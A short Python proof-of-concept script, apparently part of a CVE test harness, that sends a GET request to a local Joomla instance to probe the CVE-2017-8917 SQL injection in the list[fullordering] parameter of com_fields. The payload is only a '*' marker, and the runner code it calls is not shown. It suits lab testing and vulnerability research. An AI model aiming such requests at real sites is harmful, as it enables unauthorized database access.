#!/usr/bin/env python3
"""
[APP] Joomla 
[CVE] CVE-2017-8917 
[TYPE] SQL injection
[METHOD] GET
[CRASH_FIELDS] list[fullordering]
[TARGET_URL] http://localhost/joomla/index.php
[PARAMS] option=com_fields&view=fields&layout=modal&list[fullordering]=*
Send SQL injection payload to target application using list[fullordering] parameter
GET method to /index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*
"""

import sys
import os

# Import standardized POC utilities
from utils import *

def main():
    # Extract metadata from this file's docstring
    metadata = get_poc_metadata_from_file(__file__)
    
    # Create standardized POC runner
    poc_runner = create_standard_poc_runner(
        cve_id=metadata['cve'],
        app_name=metadata['app'], 
        vuln_type=metadata['type']
    )
    
    # CVE-specific configuration
    target_url = 'http://localhost/joomla/index.php'
    
    # CVE-2017-8917 specific payload
    params = {
        'option': 'com_fields',
        'view': 'fields', 
        'layout': 'modal',
        'list[fullordering]': '*'  # This is the vulnerable parameter
    }
    
    # Use method from metadata
    request_method = metadata['method']
    
    # Run standardized test
    exit_code = poc_runner.run_test(target_url, method=request_method, params=params)
    sys.exit(exit_code)

if __name__ == '__main__':
    main()